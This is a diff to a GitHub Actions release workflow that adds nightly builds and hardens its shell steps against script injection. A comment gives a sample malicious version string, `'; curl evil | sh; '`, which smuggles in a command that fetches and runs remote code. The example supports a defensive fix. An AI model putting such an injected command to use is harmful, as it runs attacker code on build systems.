@@ -18,6 +18,25 @@ name: public-release
 # Net effect: kick this off once from the Actions tab and a public release
 # lands on PyPI with `pip install hypernix` working immediately after.
 #
+# Nightly builds
+# --------------
+# The same pipeline also makes a nightly build, from the default branch,
+# at 03:23 UTC. It is off until the repository variable
+# PUBLIC_RELEASE_NIGHTLY is set to true (Settings -> Secrets and
+# variables -> Actions -> Variables), and a night with no new commits is
+# skipped. "Run workflow" with `nightly` ticked makes one by hand.
+#
+# A nightly is not a release: the version is the tree's plus a local
+# label (0.72.6.post3+nightly.20260930.1a2b3c4), nothing is committed,
+# no v* tag is made and nothing goes to PyPI -- no index accepts a local
+# version, so a nightly can never be mistaken for a release. It replaces
+# one rolling GitHub prerelease tagged `nightly`, which is installable
+# with `pip install <wheel URL>`. It runs the same lint, full test suite
+# and live integration jobs a release does. The HyperLink IPA is left
+# out unless PUBLIC_RELEASE_NIGHTLY_IPA is also true (a macOS runner
+# every night is the expensive part). .github/scripts/release_plan.py
+# decides which kind of run this is.
+#
 # Prereqs (one-time, by the repo owner):
 #   - Register Trusted Publishing on PyPI at
 #     https://pypi.org/manage/account/publishing/:
@@ -30,12 +49,20 @@ name: public-release
 #     publishing.
 
 on:
+  schedule:
+    # Nightly, when PUBLIC_RELEASE_NIGHTLY=true. Off the hour, because
+    # scheduled runs at :00 are the ones GitHub delays most.
+    - cron: "23 3 * * *"
   workflow_dispatch:
     inputs:
       version:
-        description: "New version, without the leading v (e.g. 0.2.0, 0.2.0-rc1, or 0.70.6-2 to rebuild/re-publish an already-released version as build 2)."
-        required: true
+        description: "New version, without the leading v (e.g. 0.2.0, 0.2.0-rc1, or 0.70.6-2 to rebuild/re-publish an already-released version as build 2). Leave empty for a nightly."
+        required: false
         type: string
+      nightly:
+        description: "Make a nightly build instead of a release: the tree's version + a nightly label, the rolling `nightly` GitHub prerelease, no commit, no v* tag, no PyPI."
+        type: boolean
+        default: false
       dry_run:
         description: "Validate + build but skip the commit, tag push, and publish."
         type: boolean
@@ -63,21 +90,67 @@ concurrency:
 
 jobs:
   # ---------------------------------------------------------------------------
+  # A release, a nightly, or nothing: see .github/scripts/release_plan.py.
+  # ---------------------------------------------------------------------------
+  plan:
+    name: plan
+    runs-on: ubuntu-latest
+    outputs:
+      run: ${{ steps.plan.outputs.run }}
+      nightly: ${{ steps.plan.outputs.nightly }}
+      version: ${{ steps.plan.outputs.version }}
+      tag: ${{ steps.plan.outputs.tag }}
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Decide
+        id: plan
+        env:
+          EVENT: ${{ github.event_name }}
+          VERSION: ${{ inputs.version }}
+          NIGHTLY: ${{ inputs.nightly }}
+          ENABLED: ${{ vars.PUBLIC_RELEASE_NIGHTLY }}
+        run: |
+          last=$(git rev-parse -q --verify 'refs/tags/nightly^{commit}' || true)
+          python3 .github/scripts/release_plan.py \
+            --event "$EVENT" --version "$VERSION" --nightly "$NIGHTLY" \
+            --enabled "$ENABLED" --head "$(git rev-parse HEAD)" \
+            --last-nightly "$last" --date "$(date -u +%Y%m%d)" | tee -a "$GITHUB_OUTPUT"
+          reason=$(grep '^reason=' "$GITHUB_OUTPUT" | tail -1 | cut -d= -f2-)
+          echo "::notice::$reason"
+
+  # ---------------------------------------------------------------------------
   # Validate, build, test, tag, push. Uploads dist/ as an artifact the
   # downstream publish jobs consume.
   # ---------------------------------------------------------------------------
   cut:
-    name: cut public release v${{ inputs.version }}
+    name: cut public release ${{ needs.plan.outputs.version }}
+    needs: plan
+    if: needs.plan.outputs.run == 'true'
     runs-on: ubuntu-latest
     permissions:
       contents: write    # commit version bump + push tag
     outputs:
       prerelease: ${{ steps.classify.outputs.prerelease }}
       tag: ${{ steps.classify.outputs.tag }}
+    env:
+      # Every step below reads these, so a nightly and a release run the
+      # same steps with the parts that make it a release switched off.
+      RELEASE_VERSION: ${{ needs.plan.outputs.version }}
+      NIGHTLY: ${{ needs.plan.outputs.nightly }}
     steps:
       - name: Validate version format
+        if: needs.plan.outputs.nightly != 'true'
+        # The dispatch input reaches the shell as an environment variable,
+        # never as text spliced into the script: a version string typed as
+        # `'; curl evil | sh; '` would otherwise run.
+        env:
+          VERSION: ${{ needs.plan.outputs.version }}
         run: |
-          v='${{ inputs.version }}'
+          v="$VERSION"
           # PEP 440 allows: N.N.N, N.N.NaN, N.N.NbN, N.N.NrcN, N.N.N.postN, N.N.N.devN
           # We map 'postr' to '.post' for PEP 440 compliance during build.
           # We also accept a bare "-N" rebuild suffix (e.g. 0.70.6-2), meaning
@@ -91,10 +164,17 @@ jobs:
 
       - name: Classify release (stable vs prerelease)
         id: classify
+        env:
+          VERSION: ${{ needs.plan.outputs.version }}
         run: |
-          v='${{ inputs.version }}'
+          v="$VERSION"
           tag="v$v"
-          if [[ "$v" =~ ^[0-9]+\.[0-9]+\.[0-9]+-[0-9]+$ ]]; then
+          if [ "$NIGHTLY" = "true" ]; then
+            echo "prerelease=true" >> "$GITHUB_OUTPUT"
+            echo "tag=nightly" >> "$GITHUB_OUTPUT"
+            echo "::notice::nightly build $v (-> the rolling nightly GitHub prerelease, not PyPI)"
+            exit 0
+          elif [[ "$v" =~ ^[0-9]+\.[0-9]+\.[0-9]+-[0-9]+$ ]]; then
             # e.g. 0.70.6-2 -- a rebuild of an already-released version
             # (PyPI post-release). Still a public, stable release -> PyPI,
             # not TestPyPI.
@@ -129,6 +209,9 @@ jobs:
           pip install "build>=1.2" "twine>=6" "ruff>=0.5" "pytest>=8" "setuptools>=77" wheel
 
       - name: Check the version this release was dispatched with
+        # A nightly takes the tree's version as it is, so there is
+        # nothing to check it against.
+        if: needs.plan.outputs.nightly != 'true'
         # Three questions, and the old inline guard conflated two of
         # them. It refused a version equal to the tree's outright --
         # "already what the tree says, use a .postN suffix" -- but
@@ -144,16 +227,20 @@ jobs:
         # What actually makes a repeat unsafe is the number naming other
         # code, which a version string cannot tell you and a tag can.
         # See .github/scripts/version_guard.py -- it is a script rather
-        # than a heredoc so tests/test_version_guard.py can drive it.
+        # than a heredoc so tests/repo/test_version_guard.py can drive it.
         #
         # It runs before torch is installed, so a release the tests would
         # reject stops in seconds rather than after the build: it holds
         # wiki/Changelog.md's newest entry to the version the bump below
         # is about to write, which is how "changelog newest is
         # 0.72.6.rc3, package is 0.72.6" failed a release ten minutes in.
+        env:
+          VERSION: ${{ needs.plan.outputs.version }}
+          ALLOW_DOWNGRADE: ${{ inputs.allow_downgrade }}
         run: |
-          python .github/scripts/version_guard.py '${{ inputs.version }}' \
-            ${{ inputs.allow_downgrade && '--allow-downgrade' || '' }}
+          extra=()
+          [ "$ALLOW_DOWNGRADE" = "true" ] && extra+=(--allow-downgrade)
+          python .github/scripts/version_guard.py "$VERSION" "${extra[@]}"
 
       - name: Install torch (CPU wheels) + package
         # pytest needs torch (hypernix imports it at module load). Install the
@@ -164,8 +251,11 @@ jobs:
           pip install -e ".[dev,t1api]"
 
       - name: Bump versions in source
+        if: needs.plan.outputs.nightly != 'true'
+        env:
+          VERSION: ${{ needs.plan.outputs.version }}
         run: |
-          v='${{ inputs.version }}'
+          v="$VERSION"
           # postr becomes .post, and a bare "-N" rebuild suffix (e.g.
           # 0.70.6-2) becomes PEP 440's post-release form (0.70.6.post2):
           # PyPI rejects a raw hyphen-number suffix, and .postN is PEP
@@ -175,12 +265,13 @@ jobs:
           # changelog against is the one written here -- the sed this
           # replaces turned 0.72.6.postr1 into 0.72.6..post1.
           pep440_v=$(python .github/scripts/version_guard.py --print-pep440 "$v")
-          python - <<PY
+          PEP440_V="$pep440_v" python - <<'PY'
+          import os
           import re
           from pathlib import Path
 
-          v = "${{ inputs.version }}"
-          pep440_v = "$pep440_v"
+          v = os.environ["VERSION"]
+          pep440_v = os.environ["PEP440_V"]
 
           p = Path("pyproject.toml")
           p.write_text(re.sub(r'^version = "[^"]+"', f'version = "{pep440_v}"', p.read_text(), count=1, flags=re.M))
@@ -192,11 +283,11 @@ jobs:
           init.write_text(re.sub(r'__version__ = "[^"]+"', f'__version__ = "{v}"', init.read_text(), count=1))
 
           # The fourth place a version string lives. install-t1.sh bakes
-          # one as the `curl | bash` fallback, for the case where there
+          # one as the piped-install fallback, for the case where there
           # is no checkout to read and no hypernix installed yet to ask
           # -- and a release that bumped the other three without this one
           # shipped an installer whose banner announced the previous
-          # version over a correct install. tests/test_install_script.py
+          # version over a correct install. tests/repo/test_install_script.py
           # fails when they drift, which is how this came to be here.
           installer = Path("install-t1.sh")
           installer.write_text(
@@ -235,19 +326,44 @@ jobs:
         # here, before lint, the full suite and the build.
         run: |
           PYTHONPATH=src pytest -q \
-            tests/test_changelog_format.py \
-            tests/test_install_script.py \
-            tests/test_install_pin.py \
-            tests/test_hyped_pro_otui.py \
-            tests/test_version_guard.py \
-            tests/test_release_push_retry.py \
-            "tests/test_tvtop_max.py::TestPackage"
+            tests/docs/test_changelog_format.py \
+            tests/repo/test_install_script.py \
+            tests/repo/test_install_pin.py \
+            tests/interfaces/test_hyped_pro_otui.py \
+            tests/repo/test_version_guard.py \
+            tests/repo/test_release_push_retry.py \
+            "tests/monitoring/test_tvtop_max.py::TestPackage"
 
       - name: Lint
         run: ruff check src/hypernix
 
       - name: Tests
         run: PYTHONPATH=src pytest -q
+
+      - name: Stamp the nightly version
+        # After the tests, which ran against the tree exactly as it is on
+        # the branch. Only the three places a built wheel and
+        # `hypernix --version` read are stamped; nothing is committed.
+        if: needs.plan.outputs.nightly == 'true'
+        run: |
+          python - <<'PY'
+          import os
+          import re
+          from pathlib import Path
+
+          v = os.environ["RELEASE_VERSION"]
+          for name, pattern, line in (
+              ("pyproject.toml", r'^version = "[^"]+"', f'version = "{v}"'),
+              ("setup.cfg", r'^version = .+$', f"version = {v}"),
+              ("src/hypernix/__init__.py", r'^__version__ = "[^"]+"', f'__version__ = "{v}"'),
+          ):
+              path = Path(name)
+              text, count = re.subn(pattern, line, path.read_text(), count=1, flags=re.M)
+              if not count:
+                  raise SystemExit(f"{name}: no version line to stamp")
+              path.write_text(text)
+              print(f"{name}: {line}")
+          PY
 
       - name: Build sdist + wheel
         run: python -m build
@@ -258,6 +374,15 @@ jobs:
       - name: Determine changelog baseline
         id: baseline
         run: |
+          if [ "$NIGHTLY" = "true" ]; then
+            # Since the last nightly, or the last tag of any kind on the
+            # first one.
+            baseline=$(git rev-parse -q --verify 'refs/tags/nightly^{commit}' >/dev/null && echo nightly \
+                       || git describe --tags --abbrev=0 2>/dev/null || true)
+            echo "baseline=$baseline" >> "$GITHUB_OUTPUT"
+            echo "::notice::changelog baseline: ${baseline:-<none>}"
+            exit 0
+          fi
           if [ '${{ steps.classify.outputs.prerelease }}' = "false" ]; then
             # Cutting a stable release: compare against the last STABLE tag,
             # skipping over any prereleases in between (e.g. v0.71.4b6,
@@ -288,6 +413,16 @@ jobs:
         run: |
           last='${{ steps.baseline.outputs.baseline }}'
           {
+            if [ "$NIGHTLY" = "true" ]; then
+              echo "## Nightly build \`$RELEASE_VERSION\`"
+              echo ""
+              echo "Built from \`${GITHUB_SHA::7}\` on $(date -u +%Y-%m-%d). **Not a release**: it has"
+              echo "passed lint, the full test suite and the live integration jobs, and"
+              echo "nothing more. It is replaced every night there is something new."
+              echo ""
+              echo "    pip install <URL of the .whl below>"
+              echo ""
+            fi
             echo "## Changelog"
             echo "![PyPI - Downloads](https://img.shields.io/pypi/dm/hypernix)"
             echo "![PyPI - Version](https://img.shields.io/pypi/v/hypernix)"
@@ -323,13 +458,16 @@ jobs:
         run: sha256sum *.whl *.tar.gz | tee SHA256SUMS
 
       - name: Update Release Timeline
+        if: needs.plan.outputs.nightly != 'true'
+        env:
+          VERSION: ${{ needs.plan.outputs.version }}
         run: |
           python - <<'PY'
           import os, subprocess
           from datetime import date
           from pathlib import Path
           
-          version = "${{ inputs.version }}"
+          version = os.environ["VERSION"]
           timeline_path = Path("wiki/Release-Timeline.md")
           
           # Same baseline the changelog fragment used (last STABLE tag when
@@ -371,17 +509,17 @@ jobs:
       - name: Upload build artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: public-release-${{ inputs.dry_run && 'dryrun-' || '' }}${{ inputs.version }}
+          name: public-release-${{ inputs.dry_run && 'dryrun-' || '' }}${{ needs.plan.outputs.version }}
           path: |
             dist/
             CHANGELOG_FRAGMENT.md
           retention-days: 14
 
       - name: Commit version bump
-        if: ${{ !inputs.dry_run }}
+        if: ${{ !inputs.dry_run && needs.plan.outputs.nightly != 'true' }}
         env:
           BRANCH: ${{ github.ref_name }}
-          VERSION: ${{ inputs.version }}
+          VERSION: ${{ needs.plan.outputs.version }}
         run: |
           git config user.name  "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
@@ -391,7 +529,7 @@ jobs:
           # list did not stage it, so the change was written, discarded,
           # and the installer drifted back to the previous version on the
           # very next release -- the bug the bump step was added to fix.
-          # tests/test_install_script.py checks the two lists agree.
+          # tests/repo/test_install_script.py checks the two lists agree.
           git add \
             pyproject.toml \
             setup.cfg \
@@ -457,7 +595,7 @@ jobs:
           fi
 
       - name: Tag and push
-        if: ${{ !inputs.dry_run }}
+        if: ${{ !inputs.dry_run && needs.plan.outputs.nightly != 'true' }}
         run: |
           tag='${{ steps.classify.outputs.tag }}'
           if git rev-parse "$tag" >/dev/null 2>&1; then
@@ -467,6 +605,16 @@ jobs:
             git push origin "$tag"
             echo "::notice::pushed $tag"
           fi
+
+      - name: Move the nightly tag
+        # One rolling tag, moved to what this nightly was built from. It
+        # is the only tag this workflow ever moves: v* tags are never
+        # rewritten.
+        if: ${{ !inputs.dry_run && needs.plan.outputs.nightly == 'true' }}
+        run: |
+          git tag -f nightly "$GITHUB_SHA"
+          git push -f origin refs/tags/nightly
+          echo "::notice::nightly -> ${GITHUB_SHA::7}"
 
   # ---------------------------------------------------------------------------
   # Create the GitHub Release and attach the built artifacts + SHA256SUMS.
@@ -687,16 +835,22 @@ jobs:
       always() &&
       needs.cut.result == 'success' &&
       !inputs.dry_run &&
-      !inputs.skip_hyperlink
+      !inputs.skip_hyperlink &&
+      (needs.cut.outputs.tag != 'nightly' || vars.PUBLIC_RELEASE_NIGHTLY_IPA == 'true')
     uses: ./.github/workflows/ios.yml
     with:
       run_tests: true
       version: ""
-    secrets: inherit
+    secrets:
+      IOS_DIST_CERTIFICATE_P12: ${{ secrets.IOS_DIST_CERTIFICATE_P12 }}
+      IOS_DIST_CERTIFICATE_PASSWORD: ${{ secrets.IOS_DIST_CERTIFICATE_PASSWORD }}
+      IOS_PROVISIONING_PROFILE: ${{ secrets.IOS_PROVISIONING_PROFILE }}
+      IOS_TEAM_ID: ${{ secrets.IOS_TEAM_ID }}
+      IOS_EXPORT_METHOD: ${{ secrets.IOS_EXPORT_METHOD }}
 
   github-release:
     name: GitHub Release
-    needs: [cut, integration-api, integration-ios, hyperlink-ipa]
+    needs: [plan, cut, integration-api, integration-ios, hyperlink-ipa]
     if: >-
       always() &&
       needs.cut.result == 'success' &&
@@ -710,7 +864,7 @@ jobs:
       - name: Download build artifact
         uses: actions/download-artifact@v4
         with:
-          name: public-release-${{ inputs.version }}
+          name: public-release-${{ needs.plan.outputs.version }}
           path: .
 
       # continue-on-error rather than `if: success()`: the IPA is a
@@ -730,11 +884,24 @@ jobs:
           ls -lah dist/
           ls -lah dist/ios/ 2>/dev/null || echo "(no iOS artifact this run)"
 
+      # The nightly release is replaced rather than added to: its files
+      # have a new version in their names every night, and updating it
+      # in place would pile up every wheel ever built. The tag stays;
+      # `cut` already moved it.
+      - name: Remove the previous nightly release
+        if: needs.plan.outputs.nightly == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: gh release delete nightly --repo "$GITHUB_REPOSITORY" --yes || true
+
       - name: Create Release
         uses: softprops/action-gh-release@v2
         with:
           tag_name: ${{ needs.cut.outputs.tag }}
-          name: hypernix ${{ needs.cut.outputs.tag }}
+          name: >-
+            ${{ needs.plan.outputs.nightly == 'true'
+                && format('hypernix nightly {0}', needs.plan.outputs.version)
+                || format('hypernix {0}', needs.cut.outputs.tag) }}
           prerelease: ${{ needs.cut.outputs.prerelease == 'true' }}
           body_path: CHANGELOG_FRAGMENT.md
           files: |
@@ -754,7 +921,7 @@ jobs:
   # ---------------------------------------------------------------------------
   pypi-publish:
     name: publish to PyPI
-    needs: [cut, integration-api, integration-ios]
+    needs: [plan, cut, integration-api, integration-ios]
     if: >-
       always() &&
       needs.cut.result == 'success' &&
@@ -762,6 +929,7 @@ jobs:
       contains(fromJSON('["success","skipped"]'), needs.integration-ios.result) &&
       !inputs.dry_run &&
       !inputs.skip_pypi &&
+      needs.plan.outputs.nightly != 'true' &&
       needs.cut.outputs.prerelease == 'false'
     runs-on: ubuntu-latest
     permissions:
@@ -773,7 +941,7 @@ jobs:
       - name: Download build artifact
         uses: actions/download-artifact@v4
         with:
-          name: public-release-${{ inputs.version }}
+          name: public-release-${{ needs.plan.outputs.version }}
           path: .
 
       - name: Strip non-PyPI files
@@ -793,7 +961,7 @@ jobs:
   # ---------------------------------------------------------------------------
   testpypi-publish:
     name: publish to TestPyPI
-    needs: [cut, integration-api, integration-ios]
+    needs: [plan, cut, integration-api, integration-ios]
     if: >-
       always() &&
       needs.cut.result == 'success' &&
@@ -801,6 +969,7 @@ jobs:
       contains(fromJSON('["success","skipped"]'), needs.integration-ios.result) &&
       !inputs.dry_run &&
       !inputs.skip_pypi &&
+      needs.plan.outputs.nightly != 'true' &&
       needs.cut.outputs.prerelease == 'true'
     runs-on: ubuntu-latest
     permissions:
@@ -812,7 +981,7 @@ jobs:
       - name: Download build artifact
         uses: actions/download-artifact@v4
         with:
-          name: public-release-${{ inputs.version }}
+          name: public-release-${{ needs.plan.outputs.version }}
           path: .
 
       - name: Strip non-PyPI files
